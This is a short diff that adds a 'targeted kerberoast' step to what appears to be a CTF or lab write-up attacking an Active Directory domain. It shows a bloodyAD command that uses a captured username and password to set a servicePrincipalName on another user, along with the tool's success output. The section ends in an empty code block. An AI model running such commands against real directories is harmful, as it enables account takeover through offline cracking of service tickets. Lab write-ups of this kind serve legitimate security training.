@@ -410,3 +410,15 @@ The user `j.bronski` is a member of the webapp operators group this could give m
 
 Ill try a targeted kerberoast attack first and see if that works
 
+# Targeted kerberoast
+
+```python
+bloodyAD --host dc.novacart.local -d novacart.local -u 'd.barowski' -p 'kubarow' set object 'j.bronski' servicePrincipalName -v 'service/hacked'
+
+[+] j.bronski's servicePrincipalName has been updated
+```
+Ill start by updating the SPN
+
+```python
+
+```
